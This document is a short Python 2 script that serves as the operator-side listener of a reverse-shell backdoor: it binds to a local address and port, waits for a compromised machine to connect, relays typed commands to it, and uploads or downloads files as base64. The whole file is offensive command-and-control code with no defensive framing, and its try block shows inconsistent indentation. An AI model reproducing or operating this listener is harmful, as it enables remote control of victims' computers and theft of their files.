#!/usr/bin/python2
import socket
import json
import base64


class Listner:
    def __init__(self,ip,port):
        listner = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listner.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
        listner.bind((ip,port))
        listner.listen(0)
        print("[+] Waiting for incomming connections")
        self.conn,addr = listner.accept()
        print("[+] Got a connection from" + str(addr) )

    def reliable_send(self,data):
        json_data = json.dumps(data)
        self.conn.send(json_data)

    def reliable_recieve(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.conn.recv(1024)
                return json.loads(json_data)
            except ValueError:
                continue

    def execute_remotely(self,command):
        self.reliable_send(command)
        if command[0] == "exit":
            self.conn.close()
            exit()
        else:
            return self.reliable_recieve()

    def write_file(self,path,content):
        with open(path,"wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Download successful"

    def read_file(self,path):
        with open(path,"rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        while(True):
            command = raw_input(">> ")
            command = command.split(" ")

            try:
               if command[0] == "upload":
                    file_content = self.read_file(command[1])
                    command.append(file_content)

                result = self.execute_remotely(command)

                if command[0] == "download" and "[-] Error" not in result:
                    result = self.write_file(command[1],result)
            except Exception:
                result = "[-] Error during command execution"

            print(result)


my_listener = Listner("192.168.1.7",1234)
my_listener.run()
